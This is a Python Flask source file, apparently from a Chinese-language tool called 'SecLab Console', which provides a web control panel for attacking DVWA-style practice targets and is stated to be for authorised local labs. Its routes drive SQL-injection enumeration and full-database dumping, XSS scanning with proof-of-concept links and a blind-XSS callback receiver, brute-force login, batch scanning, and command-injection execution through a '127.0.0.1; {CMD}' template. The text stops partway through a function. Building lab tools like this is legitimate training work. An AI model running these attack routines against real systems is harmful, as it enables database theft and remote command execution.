# -*- coding: utf-8 -*-
"""SecLab Console —— 本地靶场攻防控制台（Web 版）。

仅用于 DVWA / 自建靶场等授权环境的漏洞验证与学习。
默认监听 127.0.0.1，默认只允许本机 / 内网目标。
"""

import base64
import json
import os
import platform
import re
from urllib.parse import parse_qsl, urljoin

from flask import Flask, jsonify, request, send_from_directory

from core.brute import BruteEngine
from core.cmdi import CmdiEngine
from core.forms import parse_forms
from core.fullscan import FullScanEngine
from core.guard import TargetError, normalize_target, scope_label
from core.hits import HitStore
from core.httpclient import Agent, HTTPError
from core.regress import RegressEngine
from core.sqli import SqliEngine
from core.tasks import MANAGER, TaskStopped
from core.xss import XssEngine

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
WEB_DIR = os.path.join(BASE_DIR, "web")

app = Flask(__name__, static_folder=None)
app.config["MAX_CONTENT_LENGTH"] = 2 * 1024 * 1024
HITS = HitStore()
PIXEL = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")


# ---------------- 基础 ----------------
@app.after_request
def no_cache(resp):
    if request.path.startswith("/api/"):
        resp.headers["Cache-Control"] = "no-store"
    elif request.path.endswith((".html", ".css", ".js")) or request.path == "/":
        resp.headers["Cache-Control"] = "no-cache, must-revalidate"
    return resp


@app.get("/")
def index():
    return send_from_directory(WEB_DIR, "index.html")


@app.get("/assets/<path:filename>")
def assets(filename):
    return send_from_directory(os.path.join(WEB_DIR, "assets"), filename)


@app.get("/api/health")
def health():
    return jsonify({"ok": True, "python": platform.python_version(),
                    "platform": platform.system(), "scope": "local-lab-only"})


@app.post("/api/target/check")
def target_check():
    data = request.get_json(silent=True) or {}
    try:
        target = normalize_target(data.get("target") or {})
    except TargetError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400

    agent = Agent(target)
    try:
        resp = agent.baseline()
    except HTTPError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 502

    security = ""
    for part in (target.get("cookie") or "").split(";"):
        if "security=" in part:
            security = part.split("security=")[-1].strip()
    return jsonify({
        "ok": resp.status < 500,
        "status": resp.status,
        "length": resp.length,
        "elapsed_ms": round(resp.elapsed * 1000),
        "final_url": resp.url,
        "scope": scope_label(target["url"]),
        "security": security,
        "login_required": "login.php" in resp.url.lower(),
        "server": "",
    })


# ---------------- 通用封装 ----------------
def _target_and_agent(data: dict):
    target = normalize_target(data.get("target") or {})
    return target, Agent(target)


def _ctx(data: dict, need_columns=False, need_display=False) -> dict:
    inject = data.get("inject") or {}
    param = (inject.get("param") or "").strip()
    if not param:
        raise ValueError("缺少注入参数，请先完成注入点探测")
    quote = inject.get("quote", "")
    if quote not in ("'", '"', ""):
        raise ValueError("引号上下文不合法")
    suffix = inject.get("suffix") or "-- -"
    if suffix not in ("-- -", "#"):
        raise ValueError("注释符不合法")
    ctx = {"param": param, "quote": quote, "suffix": suffix}
    if need_columns:
        columns = int(inject.get("columns") or 0)
        if columns < 1 or columns > 50:
            raise ValueError("列数不合法，请先执行列数探测")
        ctx["columns"] = columns
    if need_display:
        display = int(inject.get("display") or 0)
        if display < 1 or display > 50:
            raise ValueError("回显列不合法，请先定位回显列")
        ctx["display"] = display
    return ctx


def _params(data: dict) -> list[str]:
    raw = data.get("params")
    if isinstance(raw, str):
        raw = [p.strip() for p in raw.split(",")]
    if not raw:
        raise ValueError("请至少选择一个测试参数")
    return [str(p).strip() for p in raw if str(p).strip()][:8]


def _start(kind: str, title: str, meta: dict, fn):
    task = MANAGER.start(kind, title, fn, meta)
    return jsonify({"task_id": task.id, "title": title})


def _guard_error(exc: Exception):
    if isinstance(exc, (TargetError, ValueError, PermissionError)):
        return jsonify({"error": str(exc)}), 400
    return jsonify({"error": str(exc)}), 500


# ---------------- 表单识别 ----------------
@app.post("/api/form/detect")
def form_detect():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        param = (data.get("param") or "").strip()
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        page = agent.baseline()
        forms = parse_forms(page.text, page.url)
        if param:
            forms.sort(key=lambda item: 0 if param in item["fields"] else 1)
        for item in forms:
            task.info(f"{item['method']} {item['action']} · 字段 {', '.join(item['names'])}")
        task.set_result({
            "forms": forms,
            "page": {"status": page.status, "length": page.length, "url": page.url},
            "summary": f"识别到 {len(forms)} 个表单" + (f"（参数 {param}）" if param else ""),
            "severity": "info",
        })

    return _start("form", "表单识别", {"url": target["url"]}, job)


# ---------------- SQL 注入 ----------------
@app.post("/api/sqli/probe")
def sqli_probe():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        params = _params(data)
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        task.step_msg("SQL 注入探测")
        engine = SqliEngine(agent, task)
        task.set_result(engine.probe(params))

    return _start("sqli", f"SQL 注入探测 · {params[0]}", {"url": target["url"]}, job)


@app.post("/api/sqli/auto")
def sqli_auto():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        params = _params(data)
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = SqliEngine(agent, task)
        result = {"stage": {}, "findings": []}
        probe = engine.probe(params)
        result["probe"] = probe
        if not probe.get("vulnerable"):
            task.set_result({**probe, "summary": "未发现 SQL 注入"})
            return
        ctx = dict(probe["best"])
        try:
            cols = engine.count_columns(ctx)
            result["stage"]["columns"] = cols
            disp = engine.find_display(ctx)
            result["stage"]["display"] = disp
        except Exception as exc:  # noqa: BLE001
            task.warn(f"UNION 流程不可用：{exc}")
            task.step_msg("自动降级为盲注提取")
            ctx.pop("columns", None)
            ctx.pop("display", None)
            try:
                blind = engine.blind_fetch(ctx, "VERSION()", 12, mode="boolean")
            except Exception as blind_exc:  # noqa: BLE001
                task.warn(f"布尔盲注失败：{blind_exc}，尝试时间盲注")
                blind = engine.blind_fetch(ctx, "VERSION()", 8, mode="time", delay=1.0)
            result["stage"]["blind"] = blind
            result["inject"] = {k: ctx[k] for k in ("param", "quote", "suffix")}
            result["mode"] = "blind"
            result["summary"] = f"UNION 不可用，盲注提取 VERSION() = {blind.get('value')}"
            result["severity"] = "high"
            task.set_result(result)
            return
        try:
            result["stage"]["fingerprint"] = engine.fingerprint(ctx)
            result["stage"]["databases"] = engine.databases(ctx)
        except Exception as exc:  # noqa: BLE001
            task.warn(f"信息枚举阶段失败：{exc}")
        result["inject"] = {k: ctx[k] for k in ("param", "quote", "suffix", "columns", "display")}
        result["summary"] = (f"SQL 注入可利用：{ctx['param']} / {probe['best']['technique']} / "
                             f"{ctx['columns']} 列 / "
                             f"{len(result['stage'].get('databases') or [])} 个库")
        result["severity"] = "critical"
        task.set_result(result)

    return _start("sqli", "SQL 注入全自动", {"url": target["url"]}, job)


@app.post("/api/sqli/columns")
def sqli_columns():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        ctx = _ctx(data)
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = SqliEngine(agent, task)
        task.set_result(engine.count_columns(ctx))

    return _start("sqli", "列数探测", {"url": target["url"]}, job)


@app.post("/api/sqli/display")
def sqli_display():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        ctx = _ctx(data, need_columns=True)
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = SqliEngine(agent, task)
        task.set_result(engine.find_display(ctx))

    return _start("sqli", "回显列定位", {"url": target["url"]}, job)


@app.post("/api/sqli/fingerprint")
def sqli_fingerprint():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        ctx = _ctx(data, need_columns=True, need_display=True)
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = SqliEngine(agent, task)
        result = engine.fingerprint(ctx)
        result["summary"] = f"数据库指纹：{result.get('version')} / {result.get('current_db')}"
        result["severity"] = "high"
        task.set_result(result)

    return _start("sqli", "数据库指纹", {"url": target["url"]}, job)


@app.post("/api/sqli/databases")
def sqli_databases():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        ctx = _ctx(data, need_columns=True, need_display=True)
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = SqliEngine(agent, task)
        items = engine.databases(ctx)
        task.set_result({"items": items, "summary": f"枚举到 {len(items)} 个数据库",
                         "severity": "high"})

    return _start("sqli", "枚举数据库", {"url": target["url"]}, job)


@app.post("/api/sqli/tables")
def sqli_tables():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        ctx = _ctx(data, need_columns=True, need_display=True)
        database = (data.get("database") or "").strip()
        if not database:
            raise ValueError("请先选择数据库")
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = SqliEngine(agent, task)
        items = engine.tables(ctx, database)
        task.set_result({"items": items, "database": database,
                         "summary": f"{database} 中 {len(items)} 张表", "severity": "high"})

    return _start("sqli", f"枚举 {database} 表", {"url": target["url"]}, job)


@app.post("/api/sqli/fields")
def sqli_fields():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        ctx = _ctx(data, need_columns=True, need_display=True)
        database = (data.get("database") or "").strip()
        table = (data.get("table") or "").strip()
        if not database or not table:
            raise ValueError("请先选择数据库和表")
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = SqliEngine(agent, task)
        items = engine.columns(ctx, database, table)
        task.set_result({"items": items, "database": database, "table": table,
                         "summary": f"{table} 中 {len(items)} 个字段", "severity": "high"})

    return _start("sqli", f"枚举 {table} 字段", {"url": target["url"]}, job)


@app.post("/api/sqli/dump")
def sqli_dump():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        ctx = _ctx(data, need_columns=True, need_display=True)
        database = (data.get("database") or "").strip()
        table = (data.get("table") or "").strip()
        fields = data.get("fields") or []
        if not database or not table or not fields:
            raise ValueError("导出前需要数据库、表和字段列表")
        limit = max(1, min(int(data.get("limit") or 10), 50))
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = SqliEngine(agent, task)
        out = engine.dump(ctx, database, table, [str(f) for f in fields], limit=limit)
        out["summary"] = f"导出 {database}.{table} 共 {len(out['rows'])} 行"
        out["severity"] = "critical"
        task.set_result(out)

    return _start("sqli", f"导出 {database}.{table}", {"url": target["url"]}, job)


@app.post("/api/sqli/blind")
def sqli_blind():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        ctx = _ctx(data)
        expr = (data.get("expr") or "VERSION()").strip()
        if not expr or len(expr) > 200:
            raise ValueError("表达式不能为空且不超过 200 字符")
        max_len = max(1, min(int(data.get("max_len") or 32), 80))
        mode = (data.get("mode") or "boolean").lower()
        if mode not in ("boolean", "time"):
            raise ValueError("盲注模式不合法")
        sleep_delay = max(0.5, min(float(data.get("delay") or 1.0), 5.0))
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = SqliEngine(agent, task)
        out = engine.blind_fetch(ctx, expr, max_len, mode=mode, delay=sleep_delay)
        out["summary"] = f"盲注提取 {expr} → {out['value'][:60]}"
        out["severity"] = "high"
        task.set_result(out)

    return _start("sqli", "盲注提取", {"url": target["url"]}, job)


@app.post("/api/sqli/blind_dump")
def sqli_blind_dump():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        ctx = _ctx(data)
        database = (data.get("database") or "").strip()
        if not database:
            raise ValueError("请填写要拖库的数据库名")
        table = (data.get("table") or "").strip()
        raw_cols = data.get("columns")
        if isinstance(raw_cols, str):
            raw_cols = [c.strip() for c in raw_cols.split(",")]
        columns = [str(c).strip() for c in (raw_cols or []) if str(c).strip()][:8]
        rows = max(1, min(int(data.get("rows") or 3), 20))
        max_tables = max(1, min(int(data.get("max_tables") or 5), 12))
        mode = (data.get("mode") or "boolean").lower()
        if mode not in ("boolean", "time"):
            raise ValueError("盲注模式不合法")
        sleep_delay = max(0.5, min(float(data.get("delay") or 1.0), 5.0))
        if mode == "time" and not table:
            raise ValueError("时间盲注整库枚举过慢，请先指定单表")
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = SqliEngine(agent, task)
        if table:
            out = engine.blind_dump(ctx, database, table, columns=columns, rows=rows,
                                    mode=mode, delay=sleep_delay)
            out["summary"] = (f"盲注导出 {database}.{table}：{len(out['rows'])} 行 / "
                              f"{out['requests']} 次请求")
            out["severity"] = "critical"
        else:
            out = engine.blind_dump_db(ctx, database, mode=mode, delay=sleep_delay,
                                       rows=rows, max_tables=max_tables)
            out["summary"] = (f"盲注整库 {database}：{len(out['tables'])} 张表 / "
                              f"{out['total_rows']} 行 / {out['requests']} 次请求")
            out["severity"] = "critical"
        task.set_result(out)

    title = f"盲注拖库 {database}" + (f".{table}" if table else "（整库）")
    return _start("sqli", title, {"url": target["url"]}, job)


@app.post("/api/sqli/dump_all")
def sqli_dump_all():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        ctx = _ctx(data, need_columns=True, need_display=True)
        database = (data.get("database") or "").strip()
        if not database:
            raise ValueError("请先选择数据库")
        limit = max(1, min(int(data.get("limit") or 5), 20))
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = SqliEngine(agent, task)
        out = engine.dump_all(ctx, database, limit=limit)
        out["summary"] = f"整库导出 {database}：{len(out['tables'])} 张表 / {out['total_rows']} 行"
        out["severity"] = "critical"
        task.set_result(out)

    return _start("sqli", f"整库导出 {database}", {"url": target["url"]}, job)


@app.post("/api/sqli/custom")
def sqli_custom():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        ctx = _ctx(data, need_columns=True, need_display=True)
        expr = (data.get("expr") or "").strip()
        if not expr:
            raise ValueError("请输入 SQL 表达式")
        if len(expr) > 500:
            raise ValueError("表达式过长")
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = SqliEngine(agent, task)
        value = engine.custom(ctx, expr)
        task.set_result({"expr": expr, "value": value,
                         "summary": f"自定义表达式返回：{(value or '空')[:80]}",
                         "severity": "high"})

    return _start("sqli", "自定义表达式", {"url": target["url"]}, job)


# ---------------- XSS ----------------
@app.post("/api/xss/scan")
def xss_scan():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        raw_param = (data.get("param") or "").strip()
        if not raw_param:
            raise ValueError("请填写要测试的参数名，例如 name")
        params = [item for item in re.split(r"[,;\s]+", raw_param) if item][:8]
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = XssEngine(agent, task)
        if len(params) > 1:
            task.set_result(engine.analyze_multi(params))
        else:
            result = engine.analyze(params[0])
            result["params"] = params
            result["poc_param"] = params[0]
            task.set_result(result)

    title = f"XSS 检测 · {params[0]}" if len(params) == 1 else f"XSS 检测 · {len(params)} 个参数"
    return _start("xss", title, {"url": target["url"]}, job)


@app.post("/api/xss/deep")
def xss_deep():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        param = (data.get("param") or "").strip().split(",")[0].strip()
        if not param:
            raise ValueError("请填写参数名")
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = XssEngine(agent, task)
        task.set_result(engine.deep_scan(param))

    return _start("xss", f"深度向量扫描 · {param}", {"url": target["url"]}, job)


@app.post("/api/xss/dom")
def xss_dom():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = XssEngine(agent, task)
        task.set_result(engine.dom_scan())

    return _start("xss", "DOM 型 XSS 静态分析", {"url": target["url"]}, job)


@app.post("/api/xss/variants")
def xss_variants():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        param = (data.get("param") or "").strip()
        payload = (data.get("payload") or "<script>alert(1)</script>").strip()
        if not param:
            raise ValueError("请填写参数名")
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = XssEngine(agent, task)
        out = engine.variants(param, payload)
        out["summary"] = f"{len(out['working'])} 个变体可原样反射"
        out["severity"] = "high" if out["working"] else "info"
        task.set_result(out)

    return _start("xss", "XSS 绕过变体", {"url": target["url"]}, job)


@app.post("/api/xss/poc")
def xss_poc():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        param = (data.get("param") or "").strip()
        payloads = data.get("payloads") or ["<script>alert(1)</script>"]
        if not param or not payloads:
            raise ValueError("缺少参数或 payload")
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = XssEngine(agent, task)
        out = engine.build_poc(param, [str(p) for p in payloads], target["url"])
        out["summary"] = f"生成 {len(out['links'])} 条 XSS 触发链路"
        out["severity"] = "high"
        task.set_result(out)

    return _start("xss", "XSS POC 生成", {"url": target["url"]}, job)


@app.post("/api/xss/headers")
def xss_headers():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = XssEngine(agent, task)
        task.set_result(engine.headers_audit())

    return _start("xss", "响应头与 CSP 审计", {"url": target["url"]}, job)


@app.post("/api/xss/stored")
def xss_stored():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        submit_url = (data.get("submit_url") or target["url"]).strip()
        verify_url = (data.get("verify_url") or submit_url).strip()
        for candidate in (submit_url, verify_url):
            normalize_target({**target, "url": candidate, "data": {}})
        name_field = (data.get("name_field") or "txtName").strip()
        message_field = (data.get("message_field") or "mtxMessage").strip()
        raw_extra = data.get("extra") or ""
        if isinstance(raw_extra, dict):
            extra = {str(k): str(v) for k, v in raw_extra.items()}
        else:
            extra = dict(parse_qsl(str(raw_extra), keep_blank_values=True))
        deep = bool(data.get("deep"))
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = XssEngine(agent, task)
        out = engine.analyze_stored(submit_url, verify_url, name_field, message_field,
                                    extra, deep=deep)
        task.set_result(out)

    title = "存储型 XSS 深度向量" if deep else "存储型 XSS 检测"
    return _start("xss", title, {"url": target["url"]}, job)


# ---------------- 盲打 XSS 接收端 ----------------
@app.route("/api/xss/hit", methods=["GET", "POST", "OPTIONS"])
def xss_hit():
    if request.method == "OPTIONS":
        resp = app.response_class("", status=204)
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        return resp
    body = request.get_json(silent=True) or {}
    token = request.values.get("t") or body.get("t", "")
    page = request.values.get("u") or body.get("u", "")
    referer = (request.values.get("r") or body.get("r", "")
               or request.headers.get("Referer", ""))
    HITS.add(token, page, referer, request.headers.get("User-Agent", ""),
             request.remote_addr or "")
    resp = app.response_class(PIXEL, mimetype="image/gif")
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp


@app.get("/api/xss/hits")
def xss_hits():
    items = HITS.list()
    return jsonify({"items": items, "count": len(items)})


@app.delete("/api/xss/hits")
def xss_hits_clear():
    HITS.clear()
    return jsonify({"ok": True})


# ---------------- 命令注入 ----------------
@app.post("/api/cmdi/probe")
def cmdi_probe():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        params = _params(data)
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = CmdiEngine(agent, task)
        task.set_result(engine.probe(params))

    return _start("cmdi", "命令注入探测", {"url": target["url"]}, job)


@app.post("/api/cmdi/blind")
def cmdi_blind():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        param = (data.get("param") or "").strip()
        template = (data.get("template") or "").strip() or None
        if not param:
            raise ValueError("请先完成注入点探测或填写参数名")
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = CmdiEngine(agent, task)
        task.set_result(engine.blind_probe(param, template))

    return _start("cmdi", "盲命令探测", {"url": target["url"]}, job)


@app.post("/api/cmdi/execute")
def cmdi_execute():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        param = (data.get("param") or "").strip()
        template = (data.get("template") or "127.0.0.1; {CMD}").strip()
        command = (data.get("command") or "").strip()
        allow_all = bool(data.get("allow_all"))
        if not param:
            raise ValueError("请先完成注入点探测")
        if "{CMD}" not in template:
            raise ValueError("payload 模板必须包含 {CMD} 占位符")
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = CmdiEngine(agent, task)
        engine.check_command(command, allow_all)
        out = engine.execute(param, template, command, allow_all)
        out["summary"] = f"命令 `{command}` 执行完成，输出 {len(out['output'])} 字符"
        out["severity"] = "critical"
        task.set_result(out)

    return _start("cmdi", f"命令执行 · {command[:24]}", {"url": target["url"]}, job)


# ---------------- 弱口令 ----------------
@app.post("/api/brute/run")
def brute_run():
    data = request.get_json(silent=True) or {}
    try:
        target, agent = _target_and_agent(data)
        cfg = dict(data.get("options") or {})
        if not cfg.get("usernames"):
            cfg["usernames"] = cfg.get("users") or ""
        if not cfg.get("passwords"):
            cfg["passwords"] = ""
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        engine = BruteEngine(agent, task)
        task.set_result(engine.run(cfg))

    return _start("brute", "弱口令爆破", {"url": target["url"]}, job)


# ---------------- 靶场自动登录 ----------------
@app.post("/api/auth/login")
def auth_login():
    data = request.get_json(silent=True) or {}
    try:
        login_url = (data.get("login_url") or "").strip()
        if not login_url:
            base = (data.get("base_url") or "").strip()
            if not base:
                raise ValueError("请填写登录页地址（例如 http://127.0.0.1/login.php）")
            login_url = urljoin(base.rstrip("/") + "/", "login.php")
        normalize_target({"url": login_url})
        username = (data.get("username") or "").strip()
        password = data.get("password") or ""
        if not username or not password:
            raise ValueError("请填写靶场用户名和密码")
        level = (data.get("security") or "").strip().lower()
        if level and level not in ("low", "medium", "high", "impossible"):
            raise ValueError("安全级别不合法")
    except (TargetError, ValueError) as exc:
        return _guard_error(exc)

    def job(task):
        agent = Agent({"url": login_url, "delay": 0.0, "cookie": ""})
        task.step_msg("打开登录页")
        page = agent.raw("GET", login_url)
        forms = parse_forms(page.text, page.url)
        form = next((item for item in forms if "password" in item["fields"]), None)
        if not form:
            raise RuntimeError("登录页里没有找到密码表单，请确认地址是否正确")

        names = form["names"]
        user_field = next((n for n in names if "user" in n.lower()), "username")
        pass_field = next((n for n in names if "pass" in n.lower()), "password")
        token_field = next((n for n in names if "token" in n.lower()), None)
        task.info(f"登录表单：{form['method']} {form['action']}")
        task.info(f"字段：{', '.join(names)}" + (f"（含 {token_field}）" if token_field else ""))

        payload = dict(form["fields"])
        payload[user_field] = username
        payload[pass_field] = password
        resp = agent.raw("POST", form["action"], data=payload)

        logged = ("login.php" not in resp.url.lower()) and ("logout" in resp.text.lower())
        if not logged:
            if token_field and "token" in resp.text.lower():
                raise RuntimeError("登录被拒：CSRF token 校验失败，请重试一次")
            raise RuntimeError("登录失败：用户名或密码错误，或靶场要求额外的验证码")
        task.ok(f"登录成功，当前页面 {resp.url}")

        if level:
            try:
                agent.raw("GET", urljoin(login_url, "security.php"),
                          params={"security": level, "phpids": "off"})
                task.ok(f"已把靶场安全级别设为 {level.upper()}")
            except HTTPError as exc:
                task.warn(f"设置难度失败（不影响登录）：{exc}")

        cookies = agent.session.cookies.get_dict()
        if not cookies:
            raise RuntimeError("登录成功但没有拿到任何 Cookie，请检查靶场地址")
        if level:
            # DVWA 直接读 Cookie 里的 security，security.php 不一定能改成功，这里强制覆盖
            cookies["security"] = level
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
        shown = {k: ("***" if "sess" in k.lower() else v) for k, v in cookies.items()}
        task.data(f"Cookie：{'; '.join(f'{k}={v}' for k, v in shown.items())}")
        task.set_result({
            "cookie": cookie_str,
            "cookies": list(cookies.keys()),
            "username": username,
            "security": level or "（未指定）",
            "final_url": resp.url,
            "summary": f"已登录 {username}，获取到 {len(cookies)} 个 Cookie",
            "severity": "info",
        })

    return _start("auth", "靶场自动登录", {"url": login_url}, job)


# ---------------- 全模块回归 ----------------
@app.post("/api/regress")
def regress():
    data = request.get_json(silent=True) or {}
    raw = data.get("targets") or {}
    if not isinstance(raw, dict) or not raw:
        return jsonify({"error": "缺少模块目标配置"}), 400
    targets = {str(k): v for k, v in raw.items() if isinstance(v, dict)}
    opts = data.get("options") or {}
    # 先做一遍护栏校验，避免把非法目标带进任务队列
    try:
        for cfg in targets.values():
            if (cfg.get("url") or "").strip():
                normalize_target(cfg)
    except TargetError as exc:
        return _guard_error(exc)

    def job(task):
        engine = RegressEngine(task)
        task.set_result(engine.run(targets, opts))

    first = next((cfg.get("url") for cfg in targets.values() if cfg.get("url")), "")
    return _start("regress", "全模块回归", {"url": first}, job)


@app.post("/api/matrix")
def matrix():
    data = request.get_json(silent=True) or {}
    raw = data.get("targets") or {}
    if not isinstance(raw, dict) or not raw:
        return jsonify({"error": "缺少模块目标配置"}), 400
    targets = {str(k): v for k, v in raw.items()
               if isinstance(v, dict) and (v.get("url") or "").strip()}
    if not targets:
        return jsonify({"error": "没有填写任何模块地址"}), 400
    levels = data.get("levels") or ["low", "medium", "high"]
    if not isinstance(levels, list):
        return jsonify({"error": "难度参数不合法"}), 400
    levels = [str(lv).lower() for lv in levels if str(lv).lower() in
              ("low", "medium", "high")][:3]
    if not levels:
        return jsonify({"error": "请至少选择一个难度"}), 400
    try:
        for cfg in targets.values():
            normalize_target(cfg)
    except TargetError as exc:
        return _guard_error(exc)

    def job(task):
        engine = RegressEngine(task)
        task.set_result(engine.run_matrix(targets, levels))

    first = next((cfg.get("url") for cfg in targets.values()), "")
    return _start("matrix", "难度矩阵", {"url": first}, job)


# ---------------- 一键全流程 ----------------
@app.post("/api/fullscan")
def fullscan():
    data = request.get_json(silent=True) or {}
    raw = data.get("targets") or {}
    if not isinstance(raw, dict) or not raw:
        return jsonify({"error": "缺少模块目标配置"}), 400
    targets = {str(k): v for k, v in raw.items() if isinstance(v, dict)}
    opts = data.get("options") or {}
    try:
        for cfg in targets.values():
            if (cfg.get("url") or "").strip():
                normalize_target(cfg)
    except TargetError as exc:
        return _guard_error(exc)

    def job(task):
        engine = FullScanEngine(task)
        task.set_result(engine.run(targets, opts))

    first = next((cfg.get("url") for cfg in targets.values() if cfg.get("url")), "")
    return _start("fullscan", "一键全流程", {"url": first}, job)


# ---------------- 批量扫描 ----------------
@app.post("/api/batch")
def batch():
    data = request.get_json(silent=True) or {}
    module = (data.get("module") or "sqli").strip().lower()
    if module not in ("sqli", "xss", "cmdi"):
        return jsonify({"error": "模块只能是 sqli / xss / cmdi"}), 400
    raw = data.get("urls")
    if isinstance(raw, str):
        urls = [line.strip() for line in raw.splitlines() if line.strip()]
    elif isinstance(raw, list):
        urls = [str(item).strip() for item in raw if str(item).strip()]
    else:
        urls = []
    if not urls:
        return jsonify({"error": "请至少填写一个目标地址"}), 400
    if len(urls) > 20:
        urls = urls[:20]
    raw_params = data.get("params")
    if isinstance(raw_params, str):
        params = [p.strip() for p in raw_params.split(",") if p.strip()]
    elif isinstance(raw_params, list):
        params = [str(p).strip() for p in raw_params if str(p).strip()]
    else:
        params = []
    cookie = (data.get("cookie") or "").strip()
    delay = max(0.0, min(float(data.get("delay") or 0.05), 3.0))

    def job(task):
        engine = RegressEngine(task)
        task.set_result(engine.run_batch(module, urls, params, cookie, delay))

    return _start("batch", f"批量扫描 · {len(urls)} 个目标", {"url": urls[0]}, job)


# ---------------- 任务 / 历史 ----------------
@app.get("/api/tasks")
def task_list():
    items = []
    for task in MANAGER.tasks.values():
        items.append({
            "id": task.id,
            "kind": task.kind,
            "title": task.title,
            "status": task.status,
            "progress": round(task.progress, 4),
            "step": task.step,
            "started": task.started,
            "ended": task.ended,
            "log_total": len(task.logs),
            "url": task.meta.get("url", ""),
        })
    items.sort(key=lambda item: item["started"], reverse=True)
    return jsonify({"items": items[:30]})


@app.get("/api/task/<task_id>")
def task_status(task_id):
    task = MANAGER.get(task_id)
    if not task:
        return jsonify({"error": "任务不存在或已过期"}), 404
    offset = request.args.get("offset", type=int, default=0)
    return jsonify(task.to_dict(offset=offset))


@app.post("/api/task/<task_id>/stop")
def task_stop(task_id):
    ok = MANAGER.stop(task_id)
    return jsonify({"ok": ok})


@app.get("/api/history")
def history_list():
    return jsonify({"items": MANAGER.read_history()})


@app.delete("/api/history")
def history_clear():
    MANAGER.clear_history()
    return jsonify({"ok": True})


@app.get("/api/history/<record_id>")
def history_detail(record_id):
    record = MANAGER.get_record(record_id)
    if not record:
        return jsonify({"error": "记录不存在"}), 404
    return jsonify(record)


@app.get("/api/history/markdown")
def history_markdown():
    items = MANAGER.read_history()
    lines = ["# SecLab Console 测试记录", "",
             f"- 导出时间：{__import__('datetime').datetime.now():%Y-%m-%d %H:%M:%S}",
             f"- 记录数：{len(items)}", ""]
    for item in items:
        lines += [f"## {item.get('title')}", "",
                  f"- 时间：{__import__('datetime').datetime.fromtimestamp(item.get('started', 0)):%Y-%m-%d %H:%M:%S}",
                  f"- 目标：{item.get('target')}",
                  f"- 结论：{item.get('summary')}",
                  f"- 等级：{item.get('severity')}",
                  f"- 耗时：{item.get('duration')}s", ""]
    resp = app.response_class("\n".join(lines), mimetype="text/markdown")
    resp.headers["Content-Disposition"] = "attachment; filename=seclab-report.md"
    return resp


@app.get("/api/history/html")
def history_html():
